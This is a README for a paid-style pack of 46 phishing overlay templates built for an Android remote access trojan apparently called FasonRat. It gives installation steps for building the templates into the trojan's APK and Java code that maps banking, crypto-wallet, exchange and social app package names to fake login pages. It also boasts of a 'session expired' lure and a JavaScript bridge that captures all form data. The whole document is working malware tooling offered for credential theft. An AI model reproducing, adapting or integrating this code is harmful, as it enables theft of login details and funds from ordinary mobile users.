FASON PHISHING TEMPLATES v1.0
================================

46 app-specific phishing templates for FasonRat overlay system.

INSTALLATION:
1. Extract this zip
2. Copy all files from templates/ to:
   fason/app/src/main/assets/templates/
3. Update PhishletManager.java to load from assets (see below)
4. Rebuild APK

ANDROID INTEGRATION:
Replace PhishletManager.buildTemplate() with:

    private static String buildTemplate(String type, String packageName) {
        String templateName = getTemplateFileName(packageName);
        try {
            InputStream is = ctx.getAssets().open("templates/" + templateName);
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
            StringBuilder html = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                html.append(line).append("\n");
            }
            reader.close();
            return html.toString();
        } catch (Exception e) {
            return buildGenericTemplate(getAppDisplayName(packageName), getBrandColor(packageName));
        }
    }

    private static String getTemplateFileName(String packageName) {
        Map<String, String> map = new HashMap<>();
        map.put("com.whatsapp", "whatsapp.html");
        map.put("com.facebook.katana", "facebook.html");
        map.put("com.instagram.android", "instagram.html");
        map.put("com.zhiliaoapp.musically", "tiktok.html");
        map.put("com.snapchat.android", "snapchat.html");
        map.put("com.twitter.android", "x.html");
        map.put("com.discord", "discord.html");
        map.put("com.tencent.mm", "wechat.html");
        map.put("com.xingin.xhs", "xiaohongshu.html");
        map.put("com.vkontakte.android", "vk.html");
        map.put("com.viber.voip", "viber.html");
        map.put("com.binance.dev", "binance.html");
        map.put("com.coinbase.android", "coinbase.html");
        map.put("io.metamask", "metamask.html");
        map.put("com.bitget.exchange", "bitget.html");
        map.put("app.phantom", "phantom.html");
        map.put("com.wallet.crypto.trustapp", "trustwallet.html");
        map.put("com.moonpay", "moonpay.html");
        map.put("exodusmovement.exodus", "exodus.html");
        map.put("com.okinc.okex.gp", "okx.html");
        map.put("com.atomicwallet", "atomic.html");
        map.put("pi.blockchain.android", "blockchain.html");
        map.put("com.coinomi.wallet", "coinomi.html");
        map.put("com.crypto.exchange", "crypto_com.html");
        map.put("co.edgesecure.app", "edge.html");
        map.put("com.paypal.android.p2pmobile", "paypal.html");
        map.put("com.chase.sig.android", "chase.html");
        map.put("com.revolut.revolut", "revolut.html");
        map.put("com.htx.brand", "htx.html");
        map.put("com.bybit.app", "bybit.html");
        map.put("com.dydx.trading", "dydx.html");
        map.put("com.allybank", "allybank.html");
        map.put("com.capitalone", "capitalone.html");
        map.put("com.chimebank", "chimebank.html");
        map.put("com.creditone", "creditone.html");
        map.put("com.discoverfinancial.mobile", "discoverbank.html");
        map.put("com.samsung.android.spay", "samsungpay.html");
        map.put("com.google.android.apps.walletnfcrel", "googlewallet.html");
        map.put("com.eg.android.AlipayGphone", "alipay.html");
        map.put("com.boc.bocpay", "boc.html");
        map.put("sg.com.hsbc", "hsbc.html");
        map.put("com.alfa_bank", "alfabank.html");
        map.put("com.bluevine", "bluevine.html");
        map.put("com.currencyfair", "currencyfair.html");
        map.put("com.greenfi.app", "greenfi.html");
        map.put("com.airstar.bank", "airstar.html");
        return map.getOrDefault(packageName, "generic.html");
    }

FEATURES:
- Real app branding and colors
- "Session expired" prompt for legitimacy
- Mobile-optimized responsive design
- JavaScript bridge captures all form data
- Subtle Fason branding in corner

TEMPLATES INCLUDED:
Social: WhatsApp, Facebook, Instagram, TikTok, Snapchat, X, Discord, WeChat, Xiaohongshu, VK, Viber
Crypto: Binance, Coinbase, MetaMask, Bitget, Phantom, Trust Wallet, MoonPay, Exodus, OKX, Atomic, Blockchain.com, Coinomi, Crypto.com, Edge
Finance: PayPal, Chase, Revolut, HTX, Bybit, DYDX, Ally Bank, Capital One, Chime, Credit One, Discover, Samsung Pay, Google Wallet, Alipay, BOC, HSBC, Alfa Bank, Bluevine, CurrencyFair, GREENFI, AirStar

Made by Fahim Ahamed
